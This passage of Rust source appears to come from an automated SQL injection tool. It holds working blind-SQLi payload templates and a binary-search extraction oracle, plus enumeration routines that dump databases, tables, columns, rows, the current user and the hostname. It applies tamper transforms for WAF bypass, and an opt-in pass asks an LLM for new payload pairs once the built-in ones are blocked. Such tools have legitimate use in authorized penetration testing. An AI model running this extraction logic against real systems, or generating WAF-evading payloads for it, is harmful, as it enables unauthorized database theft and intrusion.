                        "' AND UNICODE(SUBSTR(({version_query}),{},1))>={} --",
                        pos + 1,
                        mid
                    ),
                    crate::dbms::DbmsKind::Unknown => format!(
                        "' AND ASCII(SUBSTRING(({version_query}),{},1))>={} -- -",
                        pos + 1,
                        mid
                    ),
                };
                // Fresh RNG per oracle call from the run seed: deterministic
                // per `--seed`, independent of async scheduling order.
                let mut rng = crate::seeded_rng::make_rng(seed);
                let payload = build_final_payload_with_rng(&base, &tampers, &popts, &mut rng);
                // Use spec-based injection to preserve param location (Query/Body/Header/Cookie) and marker handling.
                // Transport/body errors are retried (bounded) then propagated
                // as `Err` — never scored as `""` (similarity ~0 => wrong bit).
                // The engine treats `Err` as an abstention/retry, so one
                // hiccup cannot corrupt a bit.
                let mut last_err: Option<String> = None;
                for _ in 0..3 {
                    let Some(spec) = build_injection_spec_with_raw(
                        &target,
                        &target_str,
                        &param,
                        &payload,
                        &marker_set,
                        raw.as_ref(),
                        opts,
                        &popts,
                    ) else {
                        warn!(pos, mid, "extraction oracle spec build failed, retrying");
                        last_err = Some("invalid header/cookie value".to_owned());
                        continue;
                    };
                    let start = Instant::now();
                    let resp = client.send_with_retry(spec, &cancel).await;
                    let ms = start.elapsed().as_secs_f64() * 1000.0;
                    state.write().await.increment_requests();
                    let body = match resp {
                        Ok(r) => match client.read_body_string_with_timeout(r).await {
                            Ok(b) => b,
                            Err(e) => {
                                warn!(error=%e, pos, mid, "extraction oracle body read failed, retrying");
                                last_err = Some(e.to_string());
                                continue;
                            }
                        },
                        Err(e) => {
                            warn!(error=%e, pos, mid, "extraction oracle probe failed, retrying");
                            last_err = Some(e.to_string());
                            continue;
                        }
                    };
                    let diff = crate::detection::response_diff::diff_against_baseline(
                        &baseline_body,
                        &body,
                        baseline_mean2,
                        ms,
                        100.0,
                    );
                    // similar => true (>= mid)
                    return Ok::<bool, InjektError>(diff.confidence < 0.4);
                }
                Err::<bool, InjektError>(InjektError::Http(format!(
                    "extraction oracle transport failure at pos {pos} mid {mid}: {}",
                    last_err.unwrap_or_else(|| "unknown".to_owned())
                )))
            }
        };
        let extracted = match engine.extract(inferred_len, oracle, &cancel_clone).await {
            Ok(value) => value,
            Err(crate::error::InjektError::Cancelled) => {
                return Err(crate::error::InjektError::Cancelled);
            }
            Err(error) => {
                // Best-effort phase: a destabilized oracle (page changed
                // mid-run, WAF kicked in) must not nuke the detection
                // findings with a hard `inference inconsistency` failure.
                warn!(error=%error, "extraction oracle destabilized, keeping detection findings");
                return Ok(());
            }
        };
        let exposed = {
            use secrecy::ExposeSecret;
            extracted.expose_secret().to_owned()
        };
        info!(extracted=%Scrubber::hash_truncated(&exposed), len=%exposed.len(), "extraction done");
        // scrubbed hash logged, raw stored as SecretString zeroized after report
        self.state.write().await.push_extracted(extracted);
        Ok(())
    }

    /// Opt-in enumeration (`--dbs`/`--tables`/`--columns`/`--dump`/`--count`/
    /// `--banner`/`--current-user`/`--current-db`/`--hostname`), reusing the
    /// same injection point as extraction.
    #[allow(clippy::too_many_arguments, clippy::too_many_lines)]
    async fn run_enumeration(
        &self,
        target: &TargetUrl,
        target_str: &str,
        marker_set: &MarkerSet,
        raw_request: &Arc<Option<RawRequest>>,
        baseline: &baseline::Baseline,
        effective_tampers: &[Tamper],
        effective_opts: ProbeOpts,
    ) -> crate::error::Result<()> {
        if BudgetConfig::is_over_request_budget(
            self.state.read().await.request_count(),
            self.config.budget.request_budget,
        ) {
            warn!("request-budget spent, skipping enumeration");
            return Ok(());
        }
        // Reuse extraction context (`--dbms` hint wins over guessing).
        // Guess from confirmed findings only (see fingerprint gating).
        let (first_param, target_for_extract) = self.first_finding_param(target).await;

        let dbms_kind = if let Some(hint) = self.dbms_hint_kind() {
            hint
        } else {
            let snap = self.state.read().await.findings().to_vec();
            let confirmed: Vec<Finding> = snap
                .iter()
                .filter(|f| is_confirmed_finding(f))
                .cloned()
                .collect();
            crate::dbms::fingerprint::guess_from_findings(&confirmed)
                .unwrap_or(crate::dbms::DbmsKind::MySql)
        };

        let detector = crate::dbms::fingerprint::get_detector(dbms_kind);

        let baseline_body = baseline.representative_body_str();
        let baseline_mean = baseline.mean_ms;
        let client = self.client.clone();
        let state = Arc::clone(&self.state);
        let cancel = self.cancel.clone();
        let target_str = target_str.to_owned();
        let marker_set = marker_set.clone();
        let raw_request_for_enum = raw_request.as_ref().clone();

        let start = self.config.enumeration.start.unwrap_or(0);
        let stop = self.config.enumeration.stop.unwrap_or(100);

        if self.config.enumeration.dbs {
            let query = detector.list_databases_query();
            let extracted = extract_enum_field(
                &client,
                &state,
                &cancel,
                &target_for_extract,
                &target_str,
                &first_param,
                &marker_set,
                &baseline_body,
                baseline_mean,
                query.clone(),
                "databases".to_owned(),
                raw_request_for_enum.as_ref(),
                effective_tampers,
                effective_opts,
                &dbms_kind,
                &self.config.evasion.payload_opts,
                &self.config.matcher,
                &self.config.net.ignore_codes,
                self.config.seed,
            )
            .await?;
            if let Some(extracted) = extracted {
                info!(extracted=%Scrubber::hash_truncated(&extracted), "databases enumerated");
                self.state
                    .write()
                    .await
                    .push_extracted(secrecy::SecretString::from(extracted));
            }
        }

        let target_db = self.config.enumeration.db.clone().unwrap_or_default();
        if self.config.enumeration.tables && !target_db.is_empty() {
            let query = detector.list_tables_query(&target_db);
            let extracted = extract_enum_field(
                &client,
                &state,
                &cancel,
                &target_for_extract,
                &target_str,
                &first_param,
                &marker_set,
                &baseline_body,
                baseline_mean,
                query.clone(),
                "tables".to_owned(),
                raw_request_for_enum.as_ref(),
                effective_tampers,
                effective_opts,
                &dbms_kind,
                &self.config.evasion.payload_opts,
                &self.config.matcher,
                &self.config.net.ignore_codes,
                self.config.seed,
            )
            .await?;
            if let Some(extracted) = extracted {
                info!(extracted=%Scrubber::hash_truncated(&extracted), "tables enumerated for db={}", target_db);
                self.state
                    .write()
                    .await
                    .push_extracted(secrecy::SecretString::from(extracted));
            }
        }

        let target_table = self.config.enumeration.table.clone().unwrap_or_default();
        if self.config.enumeration.columns && !target_db.is_empty() && !target_table.is_empty() {
            let query = detector.list_columns_query(&target_db, &target_table);
            let extracted = extract_enum_field(
                &client,
                &state,
                &cancel,
                &target_for_extract,
                &target_str,
                &first_param,
                &marker_set,
                &baseline_body,
                baseline_mean,
                query.clone(),
                "columns".to_owned(),
                raw_request_for_enum.as_ref(),
                effective_tampers,
                effective_opts,
                &dbms_kind,
                &self.config.evasion.payload_opts,
                &self.config.matcher,
                &self.config.net.ignore_codes,
                self.config.seed,
            )
            .await?;
            if let Some(extracted) = extracted {
                info!(extracted=%Scrubber::hash_truncated(&extracted), "columns enumerated for {}.{}", target_db, target_table);
                self.state
                    .write()
                    .await
                    .push_extracted(secrecy::SecretString::from(extracted));
            }
        }

        if self.config.enumeration.dump && !target_db.is_empty() && !target_table.is_empty() {
            let columns: Vec<String> = self
                .config
                .enumeration
                .column
                .clone()
                .map(|c| c.split(',').map(|s| s.trim().to_owned()).collect())
                .unwrap_or_default();
            let query = detector.dump_table_query(&target_db, &target_table, &columns, start, stop);
            let extracted = extract_enum_field(
                &client,
                &state,
                &cancel,
                &target_for_extract,
                &target_str,
                &first_param,
                &marker_set,
                &baseline_body,
                baseline_mean,
                query.clone(),
                "dump".to_owned(),
                raw_request_for_enum.as_ref(),
                effective_tampers,
                effective_opts,
                &dbms_kind,
                &self.config.evasion.payload_opts,
                &self.config.matcher,
                &self.config.net.ignore_codes,
                self.config.seed,
            )
            .await?;
            if let Some(extracted) = extracted {
                info!(extracted=%Scrubber::hash_truncated(&extracted), "dump extracted for {}.{} rows {}-{}", target_db, target_table, start, stop);
                self.state
                    .write()
                    .await
                    .push_extracted(secrecy::SecretString::from(extracted));
            }
        }

        if self.config.enumeration.count && !target_db.is_empty() && !target_table.is_empty() {
            let query = detector.count_rows_query(&target_db, &target_table);
            let extracted = extract_enum_field(
                &client,
                &state,
                &cancel,
                &target_for_extract,
                &target_str,
                &first_param,
                &marker_set,
                &baseline_body,
                baseline_mean,
                query.clone(),
                "count".to_owned(),
                raw_request_for_enum.as_ref(),
                effective_tampers,
                effective_opts,
                &dbms_kind,
                &self.config.evasion.payload_opts,
                &self.config.matcher,
                &self.config.net.ignore_codes,
                self.config.seed,
            )
            .await?;
            if let Some(extracted) = extracted {
                info!(extracted=%Scrubber::hash_truncated(&extracted), "row count for {}.{}", target_db, target_table);
                self.state
                    .write()
                    .await
                    .push_extracted(secrecy::SecretString::from(extracted));
            }
        }

        for (flag, query, label) in [
            (
                self.config.enumeration.banner,
                detector.banner_query(),
                "banner",
            ),
            (
                self.config.enumeration.current_user,
                detector.current_user_query(),
                "current_user",
            ),
            (
                self.config.enumeration.current_db,
                detector.current_db_query(),
                "current_db",
            ),
            (
                self.config.enumeration.hostname,
                detector.hostname_query(),
                "hostname",
            ),
        ] {
            if !flag {
                continue;
            }
            let extracted = extract_enum_field(
                &client,
                &state,
                &cancel,
                &target_for_extract,
                &target_str,
                &first_param,
                &marker_set,
                &baseline_body,
                baseline_mean,
                query.clone(),
                label.to_owned(),
                raw_request_for_enum.as_ref(),
                effective_tampers,
                effective_opts,
                &dbms_kind,
                &self.config.evasion.payload_opts,
                &self.config.matcher,
                &self.config.net.ignore_codes,
                self.config.seed,
            )
            .await?;
            if let Some(extracted) = extracted {
                info!(extracted=%Scrubber::hash_truncated(&extracted), label=%label, "identity enumerated");
                self.state
                    .write()
                    .await
                    .push_extracted(secrecy::SecretString::from(extracted));
            }
        }
        Ok(())
    }
}

/// Probe fetch layer moved to `super::fetch` (P1).
/// Re-exported here for intra-engine callers during migration.
pub(crate) use super::fetch::fetch_for_payload_with_class;

/// `--ai-suggest` second-pass (opt-in post-échec / WAF-block uniquement).
///
/// Un seul passage par paramètre et par run (verrou `ai_attempted` partagé
/// entre le hook détection et le hook post-confirm), seulement si le run est
/// reparti bredouille face à un signal actionnable : WAF bloquant
/// (`is_waf_blocked() || is_waf_blocking()`), filtre applicatif (`400`
/// streak mémorisé par [`SessionState::note_app_filter_hit`]), empreinte WAF
/// live, ou `--confirm` droppé (`confirm_dropped`, hook post-confirm).
///
/// Bornes : 0 appel LLM quand OFF/incomplet/déjà-tenté/annulé/budget/deadline
/// (fail silencieux), au plus `max_suggestions` paires validées × 2 requêtes
/// (défaut 3 paires = 6 requêtes/param). Chaque paire passe par le validator
/// local avant envoi ; l'évaluation reprend `BooleanDetector` + veto matcher
/// (single-trial, `trials=1/1` en évidence — le confirm 3-trials reste une
/// option V2). Échec silencieux : aucun finding inventé, finding originel
/// jamais modifié (aucun n'existe sur ce param par construction du gate).
#[allow(clippy::too_many_arguments, clippy::too_many_lines)]
async fn run_ai_suggest_for_param(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    config: &EngineConfig,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    baseline: &baseline::Baseline,
    marker_set: &MarkerSet,
    raw: Option<&RawRequest>,
    tampers: &[Tamper],
    opts: ProbeOpts,
    popts: &PayloadOpts,
    matcher: &crate::detection::matcher::MatcherConfig,
    ignore_codes: &[u16],
    seed: Option<u64>,
    context: &InjectionContext,
    dbms_belief: &DbmsBelief,
    deadline: Option<std::time::Instant>,
    confirm_dropped: bool,
) {
    use crate::ai::{
        AiSuggestConfig, ai_hard_stop, ai_plan_label, ai_trigger, should_attempt_ai_suggest,
    };
    let ai: &AiSuggestConfig = &config.ai;
    if !ai.enabled {
        return;
    }
    let param_key = param.key();
    // Gate synchrone (0 requête) : findings vides sur ce param + trigger +
    // verrous (budget/deadline/cancel/origine down/boolean désactivé).
    let findings_empty = !state
        .read()
        .await
        .findings()
        .iter()
        .any(|f| f.parameter == param_key);
    let waf_signal = baseline.is_waf_blocked() || baseline.is_waf_blocking();
    let filter_hit = state.read().await.app_filter_hit(&param_key);
    // Empreinte WAF live en phase détection : un WAF qui ne bloque que les
    // payloads (baseline 200 propre) ne laisse aucun signal baseline, mais
    // chaque sonde bloquée est mémorisée par param dans
    // `fetch_for_payload_with_class` (les compteurs `detectability` ne sont
    // absorbés qu'en fin de run — trop tard pour ce hook).
    let live_waf_hit = state.read().await.waf_hit(&param_key);
    let trigger = ai_trigger(waf_signal, filter_hit, confirm_dropped) || live_waf_hit;
    let budget_spent = BudgetConfig::is_over_request_budget(
        state.read().await.request_count(),
        config.budget.request_budget,
    );
    let hard_stop = ai_hard_stop(
        baseline_all_error(&baseline.status_codes),
        budget_spent,
        BudgetConfig::is_past_deadline(deadline),
        cancel.is_cancelled(),
        !is_technique_enabled(&config.techniques, TechniqueKind::Boolean),
    );
    if !should_attempt_ai_suggest(ai.enabled, findings_empty, trigger, hard_stop) {
        return;
    }
    if !ai.is_complete() {
        debug!(param = param_key, "ai-suggest skipped: incomplete config");
        return;
    }
    // Verrou un-passage-par-param : le hook détection et le hook
    // post-confirm partagent ce verrou (un fetch échoué ne retente pas —
    // borné avant persistant, documenté).
    if state.read().await.has_ai_attempted(&param_key) {
        return;
    }
    state.write().await.note_ai_attempted(&param_key);
    info!(
        param = param_key,
        provider = ai.provider.map(crate::ai::AiProviderKind::name),
        waf_signal,
        filter_hit,
        "ai-suggest second-pass start (bounded, silent on failure)"
    );
    // Signaux abstraits uniquement (0 secret) + squelettes des paires L1
    // historiques pour interdire au LLM de les répéter à l'identique.
    let failed_shapes: Vec<String> =
        crate::techniques::boolean::payloads::boolean_payloads_for(dbms_payload_label(dbms_belief))
            .iter()
            .take(2)
            .map(|p| {
                crate::ai::prompt::skeletonize(&format!("{} / {}", p.true_payload, p.false_payload))
            })
            .collect();
    let signals = crate::ai::prompt::AiSignals::collect(
        context,
        dbms_belief,
        baseline.waf_vendor.as_deref(),
        &baseline.waf_hits,
        baseline.is_waf_blocking(),
        &failed_shapes,
        &context.comment.to_string(),
    );
    let system = crate::ai::prompt::system_prompt();
    let user = crate::ai::prompt::build_user_prompt(&signals, ai.max_suggestions);
    let Some(provider) = ai.provider else {
        return;
    };
    let suggested = match crate::ai::provider::fetch_suggestions(ai, system, &user, cancel).await {
        Ok(pairs) => pairs,
        Err(e) => {
            debug!(param = param_key, error = %e, "ai-suggest fetch failed, skipping silently");
            return;
        }
    };
    // Cohérence WAF-bypass (ex. auto space2comment) sans casser le
    // différentiel TRUE/FALSE : tampers effectifs filtrés boolean-safe, comme
    // `confirm_error_with_boolean`. RNG seedé : même seed → mêmes variantes.
    let mut rng = crate::seeded_rng::make_rng(seed);
    let safe_trans: Vec<Tamper> = tampers
        .iter()
        .filter(|t| t.is_boolean_safe())
        .cloned()
        .collect();
    let tamper_label = if safe_trans.is_empty() {
        "none".to_owned()
    } else {
        safe_trans
            .iter()
            .map(super::super::techniques::tamper::Tamper::name)
            .collect::<Vec<_>>()
            .join(",")
    };
    let detector = BooleanDetector::new();
    let baseline_body = matcher.pre_process(&baseline.representative_body_str());
    let mut tried: std::collections::HashSet<String> = std::collections::HashSet::new();
    let mut validated: u8 = 0;
    for (idx, pair) in suggested.iter().enumerate() {
        if cancel.is_cancelled() || check_deadline(deadline, &param_key, "ai-suggest") {
            break;
        }
        if validated >= ai.max_suggestions {
            break;
        }
        if BudgetConfig::is_over_request_budget(
            state.read().await.request_count(),
            config.budget.request_budget,
        ) {
            debug!(param = param_key, "ai-suggest stopping on request-budget");
            break;
        }
        let Ok(valid) =
            crate::ai::validator::validate_ai_pair(&pair.true_branch, &pair.false_branch, &tried)
        else {
            debug!(
                param = param_key,
                index = idx,
                "ai-suggest pair rejected by validator"
            );
            continue;
        };
        tried.insert(valid.true_payload.clone());
        tried.insert(valid.false_payload.clone());
        validated = validated.saturating_add(1);
        let true_payload =
            build_final_payload_with_rng(&valid.true_payload, &safe_trans, popts, &mut rng);
        let false_payload =
            build_final_payload_with_rng(&valid.false_payload, &safe_trans, popts, &mut rng);
        let plan = ai_plan_label(provider, validated.saturating_sub(1));
        let (true_raw, true_ms, true_status) = fetch_for_payload_with_class(
            client,
            state,
            cancel,
            target,
            target_str,
            param,
            &true_payload,
            marker_set,
            raw,
            opts,
            popts,
            RequestClass::Boolean,
        )
        .await;
        let true_body = matcher.pre_process(&true_raw);
        let (false_raw, false_ms, false_status) = fetch_for_payload_with_class(
            client,
            state,
            cancel,
            target,
            target_str,
            param,
            &false_payload,
            marker_set,
            raw,
            opts,
            popts,
            RequestClass::Boolean,
        )
        .await;
        let false_body = matcher.pre_process(&false_raw);
        // Transport/ignore/filtre : jamais scoré, jamais de finding (même
        // rigueur que `test_boolean_bounded`, en single-trial ici).
        if true_status == 0 || false_status == 0 {
            push_ai_trace(
                state,
                &param_key,
                &plan,
                seed,
                0.2,
                2.0,
                &valid.true_payload,
                &valid.false_payload,
            )
            .await;
            continue;
        }
        if is_ignored(true_status, ignore_codes) || is_ignored(false_status, ignore_codes) {
            push_ai_trace(
                state,
                &param_key,
                &plan,
                seed,
                0.2,
                2.0,
                &valid.true_payload,
                &valid.false_payload,
            )
            .await;
            continue;
        }
        if is_app_filter_block(true_status, false_status) {
            push_ai_trace(
                state,
                &param_key,
                &plan,
                seed,
                0.2,
                2.0,
                &valid.true_payload,
                &valid.false_payload,
            )
            .await;
            continue;
        }
        let res = detector.evaluate(
            &baseline_body,
            &true_body,
            &false_body,
            baseline.mean_ms,
            true_ms,
            false_ms,
        );
        if !res.is_vulnerable
            || matcher.gate_boolean(&true_body, &false_body, true_status, false_status)
                == Some(false)
        {
            push_ai_trace(
                state,
                &param_key,
                &plan,
                seed,
                res.confidence.min(0.2),
                2.0,
                &valid.true_payload,
                &valid.false_payload,
            )
            .await;
            continue;
        }
        let fp = (1.0 - res.confidence).clamp(0.0, 1.0);
        let evidence = format!(
            "boolean true_sim={:.2} false_sim={:.2} trials=1/1 fp={fp:.2} tamper={tamper_label} {plan}{}",
            res.true_similarity,
            res.false_similarity,
            matcher.evidence_suffix(),
        );
        let finding = Finding::new(
            target.as_str(),
            param_key.clone(),
            TechniqueKind::Boolean,
            res.confidence,
            evidence,
        )
        .with_false_positive_prob(fp)
        .with_waf(baseline.waf_vendor.clone(), baseline.is_waf_blocking());
        let mut finding = finding;
        finding.dbms = None;
        state.write().await.push_finding(finding);
        push_ai_trace(
            state,
            &param_key,
            &plan,
            seed,
            res.confidence,
            2.0,
            &valid.true_payload,
            &valid.false_payload,
        )
        .await;
        info!(
            param = param_key,
            plan,
            confidence = res.confidence,
            "ai-suggest confirmed finding"
        );
        break;
    }
}

/// Trace hashes-only d'une paire IA sondée (jamais de payload en clair).
#[allow(clippy::too_many_arguments)]
async fn push_ai_trace(
    state: &Arc<RwLock<SessionState>>,
    param_key: &str,
    plan: &str,
    seed: Option<u64>,
    posterior: f64,
    cost: f64,
    true_payload: &str,
    false_payload: &str,
) {
    let mut st = state.write().await;
    let seq = st.next_trace_seq();
    let req_hash = crate::reasoning::trace::hash_str_hex(&format!(
        "{param_key}:ai:{plan}:{}",
        seed.map_or("none".to_owned(), |s| s.to_string())
    ));
    let resp_hash = crate::reasoning::trace::hash_str_hex(&format!(
        "{param_key}:ai:{plan}:t={}f={}",
        crate::session::scrubber::Scrubber::hash_truncated(true_payload),
        crate::session::scrubber::Scrubber::hash_truncated(false_payload),
    ));
    st.push_trace(crate::reasoning::ProbeRecord::new(
        seq,
        param_key.to_owned(),
        TechniqueKind::Boolean.to_string(),
        plan.to_owned(),
        seed,
        req_hash,
        resp_hash,
        posterior.clamp(0.0, 1.0),
        cost,
    ));
}

/// Confirmation second-pass + mini-mutation moved to `super::confirm` (P1).
/// Only the items used by the orchestrator body/tests are re-exported here;
/// the rest stay at `crate::engine::confirm::`.
pub(crate) use super::confirm::{
    confirm_finding_second_pass, has_confirmed_finding, is_confirmed_finding,
    is_extraction_eligible, param_from_finding, run_mutation_for_finding,
};
/// Detection probes moved to `super::probes` (P1).
/// Re-exported here for intra-engine callers during migration.
pub(crate) use super::probes::{
    test_boolean_bounded, test_error_bounded, test_json_bounded, test_nosql_bounded,
    test_oob_bounded, test_stacked_bounded, test_time_bounded, test_union_bounded,
};

/// Helper to extract a single field (databases, tables, columns, dump, count) via boolean-based blind `SQLi`.
/// Uses binary search on ASCII values with the provided query.
/// Dialect-aware: length/char comparison built from `DbmsKind`
/// (`LEN` on MSSQL, `SUBSTR` on Oracle, `::text` cast on Postgres).
#[allow(clippy::too_many_arguments)]
#[allow(clippy::too_many_lines)]
async fn extract_enum_field(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    marker_set: &MarkerSet,
    baseline_body: &str,
    baseline_mean: f64,
    query: String,
    label: String,
    raw: Option<&RawRequest>,
    tampers: &[Tamper],
    opts: ProbeOpts,
    dbms_kind: &crate::dbms::DbmsKind,
    popts: &PayloadOpts,
    matcher: &crate::detection::matcher::MatcherConfig,
    _ignore_codes: &[u16],
    seed: Option<u64>,
) -> Result<Option<String>, crate::error::InjektError> {
    // Seeded tamper RNG (`--seed`): same seed yields identical payloads;
    // `None` preserves the historical OS-random behaviour.
    let mut rng = crate::seeded_rng::make_rng(seed);
    let engine = crate::extraction::engine::ExtractionEngine::new(
        crate::extraction::engine::ExtractionConfig::default(),
    );

    // Single source of truth for dialect SQL: reuse the `DbmsDetector`
    // `length_expr` / `ascii_cmp_expr` impls instead of re-matching on kind.
    let detector = crate::dbms::common::detector_for_kind(dbms_kind);
    // Matcher pre-processing (`--text-only` strips HTML) is applied to both
    // baseline and fetched bodies before `diff_against_baseline` so the
    // comparison stays consistent. No veto by `--code`/`--string` here:
    // enumeration is detection-only (a veto would only hide data). Likewise
    // `_ignore_codes` is intentionally not honored: an ignored status still
    // carries the length/char differential, and skipping the guess would
    // truncate inference (`inferred_len` under-estimate). The parameter is
    // kept (prefixed `_`) so a future policy change needs no re-plumbing
    // of the 6 callers.
    let baseline_proc = matcher.pre_process(baseline_body);

    // First infer length (max 500 chars for enum results).
    // Transport/body errors are never scored: the guess is skipped (no
    // break, no length update) so a transient blip cannot truncate
    // inference. Persistent failure aborts gracefully with `Ok(None)`.
    let mut inferred_len = 0;
    let mut consecutive_errors = 0usize;
    for len_guess in 1..=500 {
        if cancel.is_cancelled() {
            break;
        }
        let base = format!("' AND {}>={len_guess} -- -", detector.length_expr(&query));
        let payload = build_final_payload_with_rng(&base, tampers, popts, &mut rng);
        let Some(spec) = build_injection_spec_with_raw(
            target, target_str, param, &payload, marker_set, raw, opts, popts,
        ) else {
            warn!(label=%label, len_guess, "enum probe spec build failed, skipping guess");
            continue;
        };
        let start = std::time::Instant::now();
        let resp = client.send_with_retry(spec, cancel).await;
        let ms = start.elapsed().as_secs_f64() * 1000.0;
        state.write().await.increment_requests();
        let raw_body = match resp {
            Ok(r) => match client.read_body_string_with_timeout(r).await {
                Ok(b) => b,
                Err(e) => {
                    warn!(error=%e, label=%label, len_guess, "enum probe body read failed, skipping guess");
                    consecutive_errors += 1;
                    if consecutive_errors >= 5 {
                        warn!(label=%label, "enum aborted after 5 consecutive transport errors");
                        return Ok(None);
                    }
                    continue;
                }
            },
            Err(e) => {
                warn!(error=%e, label=%label, len_guess, "enum probe failed, skipping guess");
                consecutive_errors += 1;
                if consecutive_errors >= 5 {
                    warn!(label=%label, "enum aborted after 5 consecutive transport errors");
                    return Ok(None);
                }
                continue;
            }
        };
        consecutive_errors = 0;
        let body = matcher.pre_process(&raw_body);
        let diff = crate::detection::response_diff::diff_against_baseline(
            &baseline_proc,
            &body,
            baseline_mean,
            ms,
            100.0,
        );
        if diff.confidence < 0.4 {
            inferred_len = len_guess;
        } else {
            break;
        }
    }
    if inferred_len == 0 {
        warn!(label=%label, "enumeration length inference failed");
        return Ok(None);
    }

    let client_clone = client.clone();
    let state_clone = Arc::clone(state);
    let cancel_clone = cancel.clone();
    let target_clone = target.clone();
    let target_str_clone = target_str.to_owned();
    let param_clone = param.clone();
    let marker_set_clone = marker_set.clone();
    let baseline_body_clone = baseline_proc.clone();
    let baseline_mean_clone = baseline_mean;
    let query_for_oracle = query.clone();
    let raw_for_oracle = raw.cloned();
    let tampers_for_oracle = tampers.to_vec();
    let dbms_for_oracle = *dbms_kind;
    let popts_for_oracle = (*popts).clone();
    let matcher_for_oracle = matcher.clone();
    let seed_for_oracle = seed;

    let oracle = move |pos: usize, mid: u8| {
        let client = client_clone.clone();
        let state = state_clone.clone();
        let cancel = cancel_clone.clone();
        let target = target_clone.clone();
        let target_str = target_str_clone.clone();
        let param = param_clone.clone();
        let marker_set = marker_set_clone.clone();
        let baseline_body = baseline_body_clone.clone();
        let query = query_for_oracle.clone();
        let raw = raw_for_oracle.clone();
        let tampers = tampers_for_oracle.clone();
        let dbms_kind = dbms_for_oracle;
        let popts = popts_for_oracle.clone();
        let matcher = matcher_for_oracle.clone();
        let seed = seed_for_oracle;
        async move {
            let detector = crate::dbms::common::detector_for_kind(&dbms_kind);
            let cmp = detector.ascii_cmp_expr(&query, pos, mid);
            let base = format!("' AND {cmp} -- -");
            // Fresh RNG per oracle call from the run seed: deterministic per
            // `--seed`, independent of async scheduling order.
            let mut oracle_rng = crate::seeded_rng::make_rng(seed);
            let payload = build_final_payload_with_rng(&base, &tampers, &popts, &mut oracle_rng);
            // Transport/body errors are retried (bounded) then propagated as
            // `Err` — never scored as `""`. The engine treats `Err` as an
            // abstention/retry, so one hiccup cannot corrupt a bit.
            let mut last_err: Option<String> = None;
            for _ in 0..3 {
                let Some(spec) = build_injection_spec_with_raw(
                    &target,
                    &target_str,
                    &param,
                    &payload,
                    &marker_set,
                    raw.as_ref(),
                    opts,
                    &popts,
                ) else {
                    warn!(pos, mid, "enum oracle spec build failed, retrying");
                    last_err = Some("invalid header/cookie value".to_owned());
                    continue;
                };
                let start = std::time::Instant::now();
                let resp = client.send_with_retry(spec, &cancel).await;
                let ms = start.elapsed().as_secs_f64() * 1000.0;
                state.write().await.increment_requests();
                let raw_body = match resp {
                    Ok(r) => match client.read_body_string_with_timeout(r).await {
                        Ok(b) => b,
                        Err(e) => {
                            warn!(error=%e, pos, mid, "enum oracle body read failed, retrying");
                            last_err = Some(e.to_string());
                            continue;
                        }
                    },
                    Err(e) => {
                        warn!(error=%e, pos, mid, "enum oracle probe failed, retrying");
                        last_err = Some(e.to_string());
                        continue;
                    }
                };
                let body = matcher.pre_process(&raw_body);
                let diff = crate::detection::response_diff::diff_against_baseline(
                    &baseline_body,
                    &body,
                    baseline_mean_clone,
                    ms,
                    100.0,
                );
                return Ok::<bool, InjektError>(diff.confidence < 0.4);
            }
            Err::<bool, InjektError>(InjektError::Http(format!(
                "enum oracle transport failure at pos {pos} mid {mid}: {}",
                last_err.unwrap_or_else(|| "unknown".to_owned())
            )))
        }
    };

    let extracted = match engine.extract(inferred_len, oracle, cancel).await {
        Ok(value) => value,
        Err(crate::error::InjektError::Cancelled) => {
            return Err(crate::error::InjektError::Cancelled);
        }
        Err(error) => {
            // Speculative helper: an unstable oracle on a non-boolean sink is
            // the expected negative, not an actionable error. Demote to debug
            // so bulk scans don't drown in `inference inconsistency` noise.
            tracing::debug!(label=%label, error=%error, "enum oracle unstable, skipping field");
            return Ok(None);
        }
    };
    let exposed = {
        use secrecy::ExposeSecret;
        extracted.expose_secret().to_owned()
    };
    info!(label=%label, extracted=%crate::session::scrubber::Scrubber::hash_truncated(&exposed), len=%exposed.len(), "enumeration extracted");
    Ok(Some(exposed))
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod orchestrator_gating_tests {
    use super::{
        ConfirmScope, apply_outcome_to_hypothesis, dbms_payload_label, has_confirmed_finding,
        in_confirm_scope, infer_signal_and_trials, is_confirmed_finding, is_extraction_eligible,
        needs_auto_second_pass, parse_finding_dbms,
    };
    use crate::engine::{
        confirm::dbms_label_from_finding,
        schedule::{order_boolean_by_context, order_by_prefix_for_context},
    };
    use crate::{
        dbms::{
            DbmsKind,
            context::{DbmsBelief, InjectionContext, QuoteContext},
        },
        detection::baseline::{Baseline, Sample},
        reasoning::Hypothesis,
        session::state::{Finding, TechniqueKind},
    };
    use std::time::Duration;

    fn finding(technique: TechniqueKind, confidence: f64, evidence: &str) -> Finding {
        Finding::new(
            "https://example.com/?id=1",
            "id@query",
            technique,
            confidence,
            evidence,
        )
    }

    #[test]
    fn unconfirmed_error_does_not_count_as_confirmed() {
        let f = finding(
            TechniqueKind::Error,
            0.55,
            "error pattern X bool_confirm=false unconfirmed",
        );
        assert!(!is_confirmed_finding(&f));
        assert!(!has_confirmed_finding(&[f]));
    }

    #[test]
    fn boolean_and_confirmed_error_count() {
        let b = finding(
            TechniqueKind::Boolean,
            0.8,
            "boolean true_sim=0.9 false_sim=0.1",
        );
        let e = finding(
            TechniqueKind::Error,
            0.9,
            "error extracted=yes bool_confirm=true",
        );
        assert!(is_confirmed_finding(&b));
        assert!(has_confirmed_finding(&[e]));
        // Mixed: one confirmed suffices even with an unconfirmed alongside.
        let u = finding(TechniqueKind::Error, 0.55, "error unconfirmed");
        assert!(has_confirmed_finding(&[u, b]));
    }

    #[test]
    fn auto_second_pass_excludes_high_bucket() {
        // P2.4: `High` (score + FP estimate both agree) already meets the
        // ≥95 % precision claim — re-probing it would only add traffic.
        let high = finding(TechniqueKind::Boolean, 0.9, "boolean true_sim=0.95")
            .with_false_positive_prob(0.02);
        assert!(!needs_auto_second_pass(&high));
        // `--confirm` still re-validates it (scope All = historical filter).
        assert!(in_confirm_scope(&high, ConfirmScope::All));
    }

    #[test]
    fn auto_second_pass_includes_medium_and_low() {
        let medium = finding(TechniqueKind::Boolean, 0.75, "boolean true_sim=0.8")
            .with_false_positive_prob(0.10);
        let low = finding(TechniqueKind::Stacked, 0.6, "stacked marker=ok")
            .with_false_positive_prob(0.40);
